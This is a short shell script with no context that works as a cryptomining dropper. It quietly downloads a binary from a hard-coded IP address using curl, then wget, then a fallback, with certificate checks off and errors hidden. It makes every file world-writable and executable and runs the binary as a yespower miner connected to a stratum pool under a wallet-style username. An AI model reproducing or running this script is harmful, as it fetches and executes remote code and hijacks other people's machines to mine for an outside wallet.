curl -L --insecure --connect-timeout 5 --max-time 40 --fail http://51.89.88.119/xxxx -o xxxx 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 http://51.89.88.119/xxxx -O xxxx 2> /dev/null || _curl http://51.89.88.119/xxxx > xxxx 
chmod 777 * 
./xxxx -a yespower -o stratum+tcps://51.79.177.216:17017  -u web1qkle3vhlz0z6cdvkk084x2r6cqwrjkahh2msrax.PSHLin;